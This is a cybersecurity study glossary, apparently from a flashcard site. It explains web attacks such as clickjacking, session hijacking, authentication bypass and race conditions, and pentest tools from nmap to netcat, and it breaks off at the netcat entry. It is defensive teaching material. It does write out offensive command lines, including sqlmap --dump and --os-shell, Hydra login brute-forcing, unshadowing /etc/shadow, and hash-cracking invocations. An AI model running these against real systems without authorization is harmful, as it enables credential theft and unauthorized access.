  • Avoid security-relevant features in single-click flows
⚠ Common Mistakes
❌ Beliefan invisible iframe cannot attack me
✓ Realityframing tricks users into real clicks
Why: a transparent frame over bait makes victims click your hidden buttons.
❌ Weak fixJavaScript frame-busting
✓ Real fixX-Frame-Options / CSP frame-ancestors
Why: JS frame-busting can be disabled; the response headers are enforced by the browser.
⑥ Remember This
If your page can be iframed, your buttons can be hijacked.
FAQ
What is clickjacking?
Overlaying a hidden frame so the user clicks something they did not intend.
How does it work?
A transparent iframe sits over attractive bait content.
What is the defense?
X-Frame-Options or CSP frame-ancestors.
What is the impact?
Tricking users into actions like transfers or permission grants.
My Notes
Auto-saved
Learned it? Next:A·10 Session HijackingW·08 Headers
cherry root › block 6 › A·10
Session Hijacking
Stealing or guessing a session token to impersonate a user.
A·10websessionidentity
tags: Studied Review Hard Favorite
Before this term:W·10 Sessions
① Simple Definition
"Skip the login. Take the token. Become the user."
Session hijacking takes over an authenticated session via stolen cookies, predictable tokens, fixation or sniffing. Effective hijack = full account access without password.
② Explanation

Theft vectors: XSS reading cookies (if not HttpOnly), MITM over HTTP (no HTTPS), malware on victim device, network logging, server-side leakage.

Session fixation: attacker plants a known session ID before login; victim logs in into that session; attacker reuses it. Mitigation: rotate session ID on auth.

Modern apps shift to short-lived JWTs + refresh tokens, but tokens can be stolen too. The defense layers are the same: TLS, HttpOnly + Secure + SameSite cookies, server-side session invalidation on logout.

③ Where It Appears
Web apps after XSS or MITM
Public Wi-Fi sniffing
Stolen session DBs
Sticky-cookie load balancers leaking
④ How It Works
1Obtain a session token (steal, sniff, fix, predict)
2Replay it in a fresh browser
3Pass the auth check
4Act as the victim
5Stay quiet to avoid invalidation
⑤ Attack & Defense
Attack
  • XSS → cookie exfil
  • MITM on HTTP
  • Predictable session IDs
  • Token leakage via referer / logs
Defense
  • HTTPS everywhere (HSTS)
  • HttpOnly + Secure + SameSite
  • Rotate session ID on login
  • Short TTLs + server-side revocation
⚠ Common Mistakes
❌ BeliefHTTPS alone protects the session
✓ Realityalso need HttpOnly, short expiry, rotation
Why: encryption stops sniffing, but XSS or fixation can still steal or set a token.
❌ Belieflogout clears the risk
✓ Realitystolen tokens work until server-invalidated
Why: a captured token stays valid until the server actively revokes it.
⑥ Remember This
If a token equals identity, treat it like a password — short, secret, revocable.
FAQ
What is session hijacking?
Taking over a user's session by obtaining their session token.
How is the token stolen?
XSS, network sniffing, or session fixation.
What is the defense?
HttpOnly + Secure cookies, token rotation, and short expiry.
Hijacking vs fixation?
Hijacking steals a token; fixation plants a known one.
My Notes
Auto-saved
Learned it? Next:A·11 Authentication BypassW·09 Cookies
cherry root › block 6 › A·11
Authentication Bypass
Logging in without valid credentials.
A·11webauthn
tags: Studied Review Hard Favorite
Before this term:S·11 Authentication
① Simple Definition
"Skip the password. Walk through the door."
Auth bypass abuses logic flaws in the authentication flow rather than guessing or stealing credentials. Forgotten admin endpoints, broken JWT validation, password-reset chaining, response-tampering — many roads to the same outcome.
② Explanation

Categories: logic flaws (multi-step flows you can shortcut), response tampering (proxy out a success-false and flip to true), JWT bugs (alg: none, key confusion, signature bypass).

Default credentials remain massive: admin/admin, root/root, vendor defaults. Shodan-scale internet has thousands of these still live.

Password reset is often weaker than login: tokens leaked via referer, host-header injection, predictable values, no rate-limit. Audit it as carefully as login.

③ Where It Appears
Admin panels left exposed
JWT-based APIs with weak validation
Password reset endpoints
OAuth callback handlers
④ How It Works
1Map the full auth flow
2Identify trust boundaries (client vs server)
3Probe for logic gaps
4Tamper tokens / responses
5Confirm access to authenticated state
⑤ Attack & Defense
Attack
  • JWT alg: none
  • Default / weak creds
  • Skip MFA step in flow
  • Reset-token leak via Host header
Defense
  • Server-side validation of every step
  • Strong JWT libs, never trust alg
  • Block default creds at install
  • Treat reset flow as a privileged path
⚠ Common Mistakes
❌ Beliefclient-side login checks are fine
✓ Realityenforce authentication on the server
Why: a check that runs in the browser can simply be skipped or edited.
❌ Beliefan obscure admin URL is protected
✓ Realityit needs real auth, not a hidden path
Why: hidden endpoints get discovered; only proper authentication protects them.
⑥ Remember This
An auth flow with a logic gap doesn't need a password. It needs a clever attacker.
FAQ
What is authentication bypass?
Getting in without valid credentials, via flaws in the login flow.
What are common causes?
Logic flaws, default credentials, and weak password-reset flows.
What is the defense?
Server-side checks, MFA, and secure reset processes.
How does it differ from brute force?
Bypass exploits a logic flaw; brute force guesses credentials.
My Notes
Auto-saved
Learned it? Next:A·12 Race ConditionS·11 Authentication
cherry root › block 6 › A·12
Race Condition
Two operations colliding in time to break a check.
A·12webconcurrencylogic
tags: Studied Review Hard Favorite
Before this term:A·11 Authentication Bypass
① Simple Definition
"Click the button 50 times in the same millisecond. The check runs once. The action runs fifty times."
A race condition happens when the security of an operation depends on order of execution and that order isn't guaranteed. Classic web example: TOCTOU (Time-of-Check vs Time-of-Use) on balance checks, coupon redemption, voting.
② Explanation

Send concurrent requests to the same endpoint before the first has committed state. Backend reads balance = $100, withdraw $100 five times in parallel before any writes — you withdraw $500 from a $100 account.

Tools: Burp's send-group-in-parallel / single-packet attack, custom Python with asyncio / threads. The single-packet attack (Portswigger) batches requests into one TCP packet to hit the server within microseconds.

Defense is making operations atomic: DB transactions with proper isolation, optimistic locking with version columns, distributed locks (Redis SETNX). Most ORMs have race-condition footguns by default.

③ Where It Appears
Coupon / discount redemption
Voting / liking systems
Money transfers
Account-creation uniqueness checks
④ How It Works
1Identify an operation with a check and an action
2Verify whether they're atomic
3Fire many concurrent requests
4Observe whether the check is bypassed
5Cash out the inconsistent state
⑤ Attack & Defense
Attack
  • Parallel withdraw of full balance
  • Multi-redeem one-use coupon
  • Vote / like inflation
  • Bypass uniqueness checks
Defense
  • Wrap in DB transactions (proper isolation)
  • Optimistic locking (version columns)
  • Distributed locks for cross-service ops
  • Idempotency keys on writes
⚠ Common Mistakes
❌ Beliefcheck-then-act is atomic
✓ Realitythe TOCTOU gap can be exploited
Why: between checking a condition and acting on it, state can change — the time-of-check vs time-of-use gap.
❌ Beliefrare timing means it is not exploitable
✓ Realityattackers fire parallel requests to win the race
Why: sending many simultaneous requests reliably hits the tiny timing window.
⑥ Remember This
If your check and your action aren't one step, an attacker will squeeze in between.
FAQ
What is a race condition?
A bug where the outcome depends on the timing of concurrent operations.
An example?
Redeeming one coupon or withdrawing balance twice via parallel requests.
What is the defense?
Locks, atomic operations, and idempotency keys.
What is TOCTOU?
Time-Of-Check to Time-Of-Use — the gap a race exploits.
My Notes
Auto-saved
Learned it? Next:A·06 Command InjectionB·13 Process
cherry root › visuals › HTTP anatomy
HTTP Request / Response
The shape of every web conversation — and where attackers look for cracks.
Anatomy at a Glance

Request

GET /search?q=test HTTP/1.1
Host: example.com
Host header — injection / virtual-host routing
User-Agent: Mozilla/5.0 ...
Cookie: session=abc123
Cookie theft target — XSS / sniff
Authorization: Bearer xyz
Token theft — XSS / leaked in logs
Content-Type: application/json
{"key":"value"}
Injection points — SQL, XSS, command injection

Response

HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=new123
Set HttpOnly + Secure + SameSite
Content-Length: 1234
Server: nginx/1.18
Information disclosure — remove version
<html>...</html>
Reading It

Every HTTP exchange is two text blocks: a start-line, a stack of headers, a blank line, then an optional body. Attackers tamper with each part — methods to bypass auth, headers to confuse proxies, body to inject payloads.

When testing, capture the request in Burp, change one thing at a time, and read the response carefully — leaked stack traces, server versions, and reflected input are how most findings start.

cherry root › visuals › attack chain
Common Attack Flow
Nine phases an attacker moves through — from first scan to a quiet exit.
The Nine Phases
1
Reconnaissance

OSINT, target profiling, employee names, public assets.

2
Scanning

Port scans, service detection (nmap, masscan).

3
Enumeration

Banner grabbing, usernames, shares, version fingerprints.

4
Exploitation

Trigger the vulnerability and gain a foothold.

5
Privilege Escalation

From low user to root / SYSTEM / admin.

6
Persistence

Backdoors, cron, services, scheduled tasks.

7
Lateral Movement

Pivot to other hosts — pass-the-hash, SSH chains.

8
Exfiltration

Steal data via DNS, HTTPS, cloud storage.

9
Covering Tracks

Clear logs, delete artifacts, tamper timestamps.

Reading It

Real attacks rarely move in a perfect line — they loop back, branch, and revisit steps. But the model is useful: every phase has a detection opportunity for the defender. Scanning shows up in firewall logs. Persistence shows up in scheduled-task diffs. Exfiltration shows up in DNS volume spikes.

cherry root › visuals › defense in depth
Defense in Depth
Five concentric rings — every layer the attacker has to peel before reaching the data.
The Layers, Outside to In

Physical — locks, badges, surveillance cameras, building management systems. The first ring an intruder has to cross.

Network — firewall, IDS / IPS, network segmentation, VPN. Filters what can talk to what.

Endpoint — EDR, antivirus, host-based firewall, patching cadence. The agent on the box.

Application — WAF, input validation, secure coding standards, code review. The logic between user and data.

Data — encryption at rest and in transit, DLP, access control, backups. The treasure at the center.

A single layer always fails. The point of defense in depth is that the attacker has to defeat several at once — and each failure gives detection a new chance.

cherry root › visuals › kill chain
Cyber Kill Chain
Lockheed Martin's seven-step model — and where to break it.
The Seven Phases
1
Reconnaissance
Gather target intel — domains, employees, exposed services, tech stack.
attack-surface reduction · OSINT monitoring
2
Weaponization
Pair an exploit with a payload — e.g. malicious macro inside an RTF.
threat intel · IOC feeds
3
Delivery
Phish, drive-by download, USB drop, supply-chain package.
email filtering · user training · USB control
4
Exploitation
Payload executes the vulnerability on the target.
patching · sandboxing · DEP / ASLR
5
Installation
Backdoor or RAT planted for long-term access.
EDR · application allow-listing
6
Command & Control (C2)
Beacon home to attacker-controlled server for instructions.
DNS / TLS inspection · egress filtering
7
Actions on Objectives
Exfiltrate, ransom, destroy, pivot.
DLP · segmentation · backups · monitoring
Reading It

Earlier you break the chain, cheaper it is. Blocking delivery stops the rest. Detecting at actions on objectives means the data is already on its way out. Every control should be mapped to at least one phase — and ideally several.

cherry root › visuals › OSI model
OSI Model
Seven layers, top to bottom — what each one carries and how it gets attacked.
The Stack
L77
Application
HTTP · HTTPS · DNS · SSH · SMTP · FTP
What the user actually talks to. Common protocols for everyday traffic.
XSS, SQLi, command injection, request smuggling
L66
Presentation
TLS · SSL · JPEG · MIME
Encoding, compression and encryption between formats.
Heartbleed, POODLE, weak ciphers, cert spoofing
L55
Session
RPC · NetBIOS · sockets
Manages the conversation — open, maintain, close.
session hijacking, fixation, replay
L44
Transport
TCP · UDP
Port-to-port delivery, reliability and segmentation.
SYN flood, port scan, UDP flood
L33
Network
IP · ICMP · routing
IP-to-IP routing across different networks.
IP spoofing, ICMP redirect, route hijack
L22
Data Link
Ethernet · MAC · ARP · switches
Frame delivery on the local link.
ARP poisoning, MAC flood, VLAN hopping
L11
Physical
cables · fiber · hubs · radio
Raw bits as voltage, light pulses or radio waves.
cable tap, fiber splice, jamming, evil twin
Reading It

Each layer wraps the one above it before sending and unwraps it on the way up. When a packet looks weird, ask which layer is misbehaving — it points you straight at the right tool: Wireshark for L2–L4, Burp for L7, a multimeter for L1.

7
Block 7 · Pentest Tools
The Toolkit
Every pentester carries a kit. These are the tools you reach for on day one — proxy, scanner, cracker, exploiter, sniffer. Knowing the flags is what separates 'I read about it' from 'I use it'.
nmapBurpWiresharkMetasploitsqlmapHashcatHydranetcat
12 terms · T01 → T12 the right tool
cherry root › block 7 › T·01
nmap
Network mapper, port scanner, service enumerator.
T·01reconscanningnetwork
tags: Studied Review Hard Favorite
Before this term:N·10 Ports & Protocols
① Simple Definition
"Before you attack, you map. nmap draws the map."
nmap (Network Mapper) discovers hosts, open ports, services and OS versions on a network. It's the first tool out of the bag for reconnaissance and the reference scanner of the industry since 1997.
② Explanation

Modes: -sS SYN scan (stealth, default for root), -sT full TCP connect (no root needed), -sU UDP scan, -sV service/version detection, -O OS fingerprinting, -A aggressive (all of the above + scripts).

The NSE (Nmap Scripting Engine) extends scans with hundreds of scripts: --script vuln, --script http-enum, --script smb-os-discovery. This is where nmap turns from scanner into vuln-finder.

Timing templates -T0…-T5 balance stealth vs speed. -T4 is the daily-driver; -T0 is paranoid (use against IDS-heavy targets). Save output with -oA basename to dump XML/grepable/normal at once.

③ Where It Appears
External pentest discovery
Internal network mapping
CTF first command
Asset inventory
④ How It Works
1Identify target scope
2Run host discovery (-sn)
3Port scan live hosts
4Service/version detect open ports
5Run vuln scripts on services found
⑤ Common Use & Detection
Common Use
  • nmap -sS -sV -A 10.0.0.0/24
  • nmap -p- -T4 target (all 65k ports)
  • nmap --script vuln target
  • nmap -sU --top-ports 100 target
Detection
  • IDS signatures on SYN floods
  • Rate-limit on firewall
  • Block unused ports at perimeter
  • Watch auth.log + connection logs
⚠ Common Mistakes
❌ Beliefnmap -p- is quick
✓ Realityscanning all 65535 ports is slow; tune timing
Why: a full scan takes time — use -T4 and target the ports you need.
❌ Beliefscanning anything is legal
✓ Realityonly scan systems you are authorized to
Why: unauthorized scanning can be a crime — always get written permission.
⑥ Remember This
If you can't see the target, you can't hack the target. Map first.
FAQ
What is nmap?
The standard tool for discovering hosts, ports, and services.
What are common scans?
-sV (versions), -sC (default scripts), -p- (all ports).
Why care in security?
It is the first step of recon and enumeration.
Is it legal?
Only with authorization for the target.
My Notes
Auto-saved
Learned it? Next:T·03 WiresharkM·02 Scanning
cherry root › block 7 › T·02
Burp Suite
Web proxy for intercepting/modifying HTTP traffic.
T·02webproxyinterception
tags: Studied Review Hard Favorite
Before this term:N·13 Proxy
① Simple Definition
"Pause the request. Edit it. Send it. Watch what breaks."
Burp Suite is a man-in-the-middle proxy that sits between your browser and the target web app. Every request and response can be inspected, modified, replayed and automated. It's the de-facto standard for web pentesting.
② Explanation

Core tabs: Proxy (intercept + history), Repeater (replay one request a thousand times with tweaks), Intruder (fuzz parameters with payloads), Decoder, Comparer, Sequencer (token randomness).

Workflow: configure browser proxy to 127.0.0.1:8080, install the Burp CA in the browser, browse the app normally to populate site-map and history, then deep-dive specific requests in Repeater.

Community Edition is free but rate-limited on Intruder; Professional unlocks the active scanner and fast Intruder. OWASP ZAP is the open-source alternative with similar features.

③ Where It Appears
Web app pentests
API testing
Bug bounty
CTF web challenges
④ How It Works
1Start Burp + set browser proxy
2Install Burp CA cert
3Browse target to build site-map
4Send interesting requests to Repeater
5Fuzz parameters via Intruder
⑤ Common Use & Detection
Common Use
  • Tamper login response (false→true)
  • Replay requests bypassing client-side checks
  • Fuzz IDOR with Intruder
  • Single-packet race conditions
Detection
  • TLS pinning on mobile
  • Anti-tamper detection
  • WAF anomaly rules
  • Server-side validation only
⚠ Common Mistakes
❌ BeliefBurp works without setup
✓ Realityset the browser proxy + install Burp's CA
Why: without the proxy and trusted certificate, HTTPS traffic will not be intercepted.
❌ BeliefCommunity equals Pro
✓ RealityCommunity lacks the active scanner
Why: the free edition is great for manual testing but has no automated scanning.
⑥ Remember This
The browser is just one of many ways to talk HTTP. Burp removes the browser's manners.
FAQ
What is Burp Suite?
An intercepting proxy and toolkit for web application testing.
How does it work?
It sits between your browser and the server so you can view and edit traffic.
What are its key tools?
Repeater for replaying requests and Intruder for fuzzing.
Why care in security?
It is the core tool for hands-on web app testing.
My Notes
Auto-saved
Learned it? Next:T·11 curlW·06 Request & Response
cherry root › block 7 › T·03
Wireshark
Network protocol analyzer.
T·03networksniffinganalysis
tags: Studied Review Hard Favorite
Before this term:N·11 Packet
① Simple Definition
"See every packet the wire sees. Bytes don't lie."
Wireshark captures and dissects packets in real time, decoding 1000+ protocols. It's how you confirm what's actually on the wire vs what the app claims it sends.
② Explanation

Capture filters (BPF syntax: host 10.0.0.1 and port 80) limit what's captured. Display filters (http.request.method == "POST") limit what's shown. Both are essential — capture filters keep PCAP files manageable.

Follow streams (right-click → Follow → TCP Stream) reconstructs entire conversations into readable text. Great for plaintext protocols: HTTP, FTP, Telnet, unencrypted SMTP.

Pair with tcpdump on servers (tcpdump -i any -w cap.pcap port not 22), then transfer the PCAP to Wireshark on your laptop for GUI analysis. tshark is Wireshark's CLI for scripting.

③ Where It Appears
Forensic incident response
Protocol debugging
Sniffing on open Wi-Fi
Malware C2 analysis
④ How It Works
1Choose interface to capture on
2Set capture filter (reduce noise)
3Start capture, reproduce traffic
4Apply display filter to narrow down
5Follow streams, decode payloads
⑤ Common Use & Detection
Common Use
  • Sniff cleartext creds on open Wi-Fi
  • Steal session cookies from HTTP
  • Replay-attack research
  • Map internal protocols
Detection
  • TLS everywhere — encrypted = opaque
  • Disable promiscuous on switches
  • ARP-spoofing detection
  • Segment networks (no flat L2)
⚠ Common Mistakes
❌ BeliefWireshark attacks the network
✓ Realityit captures and analyzes, it does not exploit
Why: Wireshark is a passive analyzer — the insight comes from reading the traffic.
❌ Beliefyou see all traffic on a switch
✓ Realityswitches limit captures (need SPAN / tap)
Why: a switch only sends you your own traffic unless a mirror port or tap is set up.
⑥ Remember This
Apps lie about what they send. Wireshark tells the truth byte by byte.
FAQ
What is Wireshark?
A packet capture and analysis tool.
Capture vs display filters?
Capture filters limit what is recorded; display filters limit what is shown.
Why care in security?
Analyzing traffic and spotting plaintext credentials.
What about switched networks?
You need a mirror port, tap, or ARP technique to see others' traffic.
My Notes
Auto-saved
Learned it? Next:N·11 PacketM·02 Scanning
cherry root › block 7 › T·04
Metasploit
Exploit framework with payloads and listeners.
T·04exploitframeworkpayload
tags: Studied Review Hard Favorite
Before this term:S·04 Exploit
① Simple Definition
"Pick the exploit. Pick the payload. Set the target. Run."
Metasploit Framework (msf) is a modular platform for developing, testing and launching exploits. It standardizes the exploit→payload→listener pipeline so you can pivot from CVE to shell in minutes.
② Explanation

Modules: exploits (use a vuln to gain code exec), payloads (what runs after — reverse shells, Meterpreter), auxiliary (scanners, brute-force, fuzzers), post (run after access — privesc, loot, persistence).

Meterpreter is msf's premium in-memory payload: file ops, screenshots, keylogger, port forwarding, hashdump, all without writing to disk. migrate moves it to a more stable host process.

Typical flow inside msfconsole: search type:exploit cve:2021 → use exploit/... → set RHOSTS → set LHOST → set PAYLOAD → exploit. Listener handles the callback.

③ Where It Appears
Red team engagements
CVE PoC validation
CTFs (especially OSCP-style)
Defender detection tuning
④ How It Works
1Search for target vuln/CVE
2Select exploit module
3Set required options (RHOSTS, LHOST)
4Choose compatible payload
5Run + handle session
⑤ Common Use & Detection
Common Use
  • Auto-exploit known CVEs
  • Generate custom payloads via msfvenom
  • Post-exploitation modules (mimikatz, persistence)
  • Pivot through compromised host
Detection
  • Patch the CVE that the module needs
  • EDR signatures on Meterpreter staging
  • Egress filtering blocks LHOST callback
  • Detect msf shellcode patterns
⚠ Common Mistakes
❌ BeliefMetasploit hacks anything automatically
✓ Realityyou choose a module, set options, understand it
Why: it is a framework, not a magic button — you must match the exploit to the target.
❌ Belieffire exploits blindly
✓ Realitycheck the target version first
Why: the wrong exploit can crash the service and tip off defenders.
⑥ Remember This
Metasploit doesn't replace skill — it replaces typing the same exploit 100 times.
FAQ
What is Metasploit?
A framework of exploit modules, payloads, and post-exploitation tools.
Module vs payload?
The module breaks in; the payload is the code that then runs.
What is meterpreter?
A powerful in-memory payload for post-exploitation.
Is it noisy?
Yes — its default modules are well-known to defenders.
My Notes
Auto-saved
Learned it? Next:M·04 ExploitationS·04 Exploit
cherry root › block 7 › T·05
sqlmap
Automated SQL injection scanner and exploiter.
T·05sqlidatabaseautomation
tags: Studied Review Hard Favorite
Before this term:A·01 SQL Injection
① Simple Definition
"Find the SQLi, dump the DB, get the shell — all from one command."
sqlmap automates detection and exploitation of SQL injection flaws. Point it at a URL with a parameter and it tests every known SQLi variant (boolean-blind, time-blind, error, UNION, stacked) across MySQL, Postgres, MSSQL, Oracle and more.
② Explanation

Basic: sqlmap -u "http://site/?id=1". With auth: --cookie, --data for POST, -r request.txt to feed a saved Burp request. Escalation: --dbs → --tables -D db → --dump -T table.

Advanced flags: --os-shell tries to drop an OS-level shell via DB features (INTO OUTFILE, xp_cmdshell). --tor routes through Tor. --level + --risk dial up coverage at the cost of noise.

Defenders see sqlmap as noisy: thousands of malformed inputs, predictable User-Agent (overridable). Modern WAFs detect it easily; --random-agent + --tamper scripts can evade weaker ones.

③ Where It Appears
Web app pentests
Bug bounty SQLi triage
CTF database challenges
Post-finding exploitation
④ How It Works
1Spot a parameter that may hit SQL
2sqlmap -u URL --batch
3Enumerate dbs / tables / columns
4Dump target table
5Optional: --os-shell for RCE
⑤ Common Use & Detection
Common Use
  • sqlmap -r req.txt --dbs
  • --dump -T users --threads 10
  • --os-shell for command exec
  • Tamper scripts for WAF bypass
Detection
  • Parameterized queries (kill SQLi at source)
  • WAF with anomaly scoring
  • Rate-limit + IP block on malformed inputs
  • Least-privilege DB user
⚠ Common Mistakes
❌ Beliefpoint sqlmap at any site
✓ Realityauthorized targets only — it is aggressive
Why: sqlmap sends many payloads and can modify data, so consent is essential.
❌ Belief--level 1 finds everything
✓ Realityraise --level and --risk for deeper tests
Why: the default settings skip many injection points to stay fast and safe.
⑥ Remember This
sqlmap doesn't find SQLi where none exists. It finds it fast where it does.
FAQ
What is sqlmap?
A tool that detects and exploits SQL injection automatically.
What does it automate?
Finding injectable parameters, then dumping databases.
Why care in security?
It saves enormous manual effort once a candidate is found.
Which flags are risky?
High --risk can run data-modifying payloads.
My Notes
Auto-saved
Learned it? Next:A·01 SQL InjectionM·04 Exploitation
cherry root › block 7 › T·06
Gobuster / Dirb
Directory and file enumeration via wordlist brute force.
T·06enumerationbrute-forceweb
tags: Studied Review Hard Favorite
Before this term:W·05 URL
① Simple Definition
"The app has 500 endpoints. The menu shows 5. Find the other 495."
Gobuster (Go-based, fast) and Dirb (older, classic) brute-force directories, files, vhosts and DNS subdomains against a target. They hit every word in a wordlist and report what doesn't 404.
② Explanation

Gobuster modes: dir (directories/files), dns (subdomains), vhost (virtual hosts on same IP). Pair with wordlists from SecLists: common.txt, raft-medium-words.txt, subdomains-top1million-5000.txt.

Tune extensions: -x php,bak,zip,old to catch backups. Filter status codes: -s 200,204,301,302,307. Always use -t 50 threads or so — too high gets rate-limited or blocks IPs.

Modern alternative: ffuf — much faster, supports recursion, multi-fuzz (FUZZ1, FUZZ2), filtering by size/words/lines. Same idea, better engine.

③ Where It Appears
Web pentest recon
Hidden admin panels
Forgotten backup files
Subdomain enumeration
④ How It Works
1Pick wordlist matching context
2Run with extensions for tech stack
3Filter out predictable 404s
4Recursive-scan interesting dirs
5Pivot into discovered endpoints
⑤ Common Use & Detection
Common Use
  • gobuster dir -u URL -w common.txt
  • gobuster dns -d target.com -w subs.txt
  • -x php,bak finds .bak source
  • Find /admin, /.git, /backup
Detection
  • Return uniform response for invalid + valid
  • Rate-limit + WAF brute-force detection
  • Don't expose source/backup files
  • Restrict admin endpoints by IP
⚠ Common Mistakes
❌ Beliefa tiny wordlist is enough
✓ Realityresults depend entirely on the wordlist
Why: you only find paths your wordlist contains — use quality lists like SecLists.
❌ Beliefa 404 means nothing is there
✓ Realitywatch for soft-404s; filter by size/status
Why: some apps return 200 with a "not found" page, hiding real results.
⑥ Remember This
If a path responds different from the rest, it exists. Wordlists are how we ask.
FAQ
What is directory busting?
Brute-forcing hidden paths and files on a web server.
Why care in security?
It uncovers admin panels, backups, and forgotten endpoints.
Where do wordlists come from?
Collections like SecLists.
What is a soft 404?
A "not found" page served with a 200 status.
My Notes
Auto-saved
Learned it? Next:M·03 EnumerationW·05 URL
cherry root › block 7 › T·07
John the Ripper
CPU-based password cracker for hashes and encrypted files.
T·07cryptocrackingpassword
tags: Studied Review Hard Favorite
Before this term:S·10 Hashing
① Simple Definition
"You have the hash. John has the wordlist. Wait long enough, you have the password."
John the Ripper ("John", JtR) is a venerable password-cracking tool that takes hashes and tries to recover the plaintext via dictionary, rule-based mutation and brute force. The Jumbo build supports 400+ hash types.
② Explanation

Modes: Wordlist (--wordlist=rockyou.txt), Single crack (uses username/info as guess), Incremental (true brute force), Mask (--mask=?l?l?l?l?d?d).

Helpers: unshadow /etc/passwd /etc/shadow > combined then john combined. zip2john, ssh2john, rar2john extract crackable hashes from protected files. Show cracked: john --show hashfile.

Rules (--rules=Best64) mutate wordlist entries (toggle case, append digits, substitute leetspeak). Hugely increases coverage without scanning every combination from scratch.

③ Where It Appears
Post-exploitation hash dumps
CTF crypto challenges
Forensics on encrypted archives
Password audits
④ How It Works
1Identify hash type (hashid)
2Convert file to JtR format if needed
3Run with wordlist + rules
4Escalate to incremental / mask
5Show cracked passwords
⑤ Common Use & Detection
Common Use
  • john --wordlist=rockyou.txt hash
  • zip2john file.zip > hash
  • --rules=Jumbo --wordlist=...
  • --mask='?l?l?l?l?d?d'
Detection
  • Slow KDFs (bcrypt, argon2, scrypt)
  • Strong unique passwords + MFA
  • Salt all hashes (kills rainbow tables)
  • Detect repeated auth failures + lockout
⚠ Common Mistakes
❌ BeliefJohn cracks any hash instantly
✓ Realitystrong, salted hashes resist for ages
Why: bcrypt and argon2 are slow by design, so cracking can take years.
❌ BeliefJohn is the GPU cracker
✓ RealityHashcat is the GPU tool
Why: John is primarily CPU-based; Hashcat shines on GPUs.
⑥ Remember This
Any password short enough to remember is short enough to crack — unless the hash is slow.
FAQ
What is John the Ripper?
A classic password-cracking tool.
CPU or GPU?
Primarily CPU-focused, though variants add GPU support.
Why care in security?
Auditing password strength against real-world cracking.
John vs Hashcat?
John is CPU-centric and flexible; Hashcat is GPU-optimized and fast.
My Notes
Auto-saved
Learned it? Next:T·08 HashcatS·10 Hashing
cherry root › block 7 › T·08
Hashcat
GPU-accelerated password cracker — the fastest in the world.
T·08cryptocrackinggpu
tags: Studied Review Hard Favorite
Before this term:S·10 Hashing
① Simple Definition
"John on a CPU is a knife. Hashcat on a GPU is a chainsaw."
Hashcat uses GPU parallelism to crack hashes orders of magnitude faster than CPU tools. Supports 300+ hash types and is the standard for serious password cracking.
② Explanation

Attack modes: -a 0 straight wordlist, -a 1 combinator (wordlist × wordlist), -a 3 mask, -a 6 hybrid wordlist+mask, -a 7 hybrid mask+wordlist. Hash type via -m (e.g. -m 0 MD5, -m 1000 NTLM, -m 22000 WPA).

Masks use placeholders: ?l lower, ?u upper, ?d digit, ?s special, ?a all. hashcat -a 3 -m 0 hash ?l?l?l?l?d?d tests all 6-char strings of that pattern.

Rules: -r rules/best64.rule applies mutations to wordlist entries. --show displays cracked. Status during run: press s for status, p pause, r resume. Save state with --session.

③ Where It Appears
AD hash dumps (NTLM)
WiFi cracking (WPA handshakes)
Database breach hash piles
CTF crypto
④ How It Works
1Identify hash mode -m
2Pick attack mode -a
3Feed wordlist or mask
4Apply rules for mutation
5hashcat --show hash to see results
⑤ Common Use & Detection
Common Use
  • hashcat -m 1000 -a 0 hash rockyou.txt -r best64
  • -m 22000 wpa.hc22000 for WiFi
  • -a 3 ?l?l?l?l?l?l?d?d
  • Distributed cracking across rigs
Detection
  • Use slow hashes (argon2id, bcrypt cost 12+)
  • Long passphrases beat short complex
  • Salt everything
  • Rotate on breach
⚠ Common Mistakes
❌ Beliefa GPU cracks anything fast
✓ Realitybcrypt and argon2 are deliberately slow
Why: slow hash functions cut even a powerful GPU to a crawl.
❌ Beliefthe hash mode does not matter
✓ Realityset the correct -m mode
Why: the wrong -m mode tries to crack the wrong algorithm and never succeeds.
⑥ Remember This
GPUs care about hash speed, not password complexity. Slow hashes are the only real defense.
FAQ
What is Hashcat?
A fast, GPU-accelerated password cracker.
What attack modes exist?
Wordlist, mask (brute force), and rule-based.
Why care in security?
It shows how quickly weak or fast-hashed passwords fall.
Hashcat vs John?
Hashcat is GPU-optimized; John is CPU-centric and versatile.
My Notes
Auto-saved
Learned it? Next:T·07 John the RipperS·10 Hashing
cherry root › block 7 › T·09
Hydra
Network login brute-forcer for SSH, FTP, HTTP forms and more.
T·09brute-forcenetworklogin
tags: Studied Review Hard Favorite
Before this term:L·12 SSH
① Simple Definition
"Hashcat cracks offline hashes. Hydra hammers live logins."
Hydra (THC-Hydra) brute-forces login credentials over the network. Supports 50+ protocols: SSH, FTP, RDP, SMB, HTTP basic/digest/form, MySQL, Postgres, VNC.
② Explanation

Syntax: hydra -l user -P passwords.txt ssh://target. -L for userlist, -P for password list, -t 4 threads (SSH dislikes high concurrency).

HTTP form: hydra -L users -P pass http-post-form "/login:user=^USER^&pass=^PASS^:F=invalid". The F= string is what appears in a failed response — used to distinguish failure from success.

Use sparingly on real targets — account lockouts, rate-limits and SOC alerts are the norm. For online brute-force think low and slow: small wordlist of likely passwords (password123, season+year, company name).

③ Where It Appears
External pentest (SSH, RDP)
Web login forms
Internal AD password spray
Default-cred sweep
④ How It Works
1Identify service + login path
2Build small targeted wordlist
3Choose protocol module
4Tune -t to avoid lockouts
5Confirm hit, log in manually
⑤ Common Use & Detection
Common Use
  • hydra -L users -P pass ssh://10.0.0.1
  • http-post-form against login pages
  • Password spray: one pass × many users
  • -x 6:8:a incremental
Detection
  • Lockouts after N failures
  • Per-IP and per-account rate-limit
  • MFA on every login
  • Fail2ban / SOC alerts on burst
⚠ Common Mistakes
❌ Beliefonline brute force is fast
✓ Realityrate limits and lockouts slow it; it is noisy
Why: each guess is a real login attempt, so defenses and logs catch it quickly.
❌ Beliefno consent is needed to test logins
✓ Realityonly with explicit authorization
Why: brute-forcing someone's login without permission is illegal.
⑥ Remember This
Online brute force is loud. Spray once with the obvious — then stop and pivot.
FAQ
What is Hydra?
A tool for online brute-forcing of login services.
Online vs offline cracking?
Online attacks the live service; offline cracks captured hashes.
Why care in security?
It tests credential strength against real services like SSH and web logins.
What stops it?
Lockouts, rate limiting, and MFA.
My Notes
Auto-saved
Learned it? Next:L·12 SSHS·11 Authentication
cherry root › block 7 › T·10
netcat
Swiss army knife of networking — listener, scanner, file transfer.
T·10networkshellswiss-army
tags: Studied Review Hard Favorite
Before this term:N·10 Ports & Protocols
① Simple Definition
"If TCP can do it, netcat can do it in one line."
netcat (nc) reads and writes data across TCP/UDP connections. It's a low-level Lego brick: listener, client, port scanner, banner grabber, file transfer, reverse shell all from the same binary.
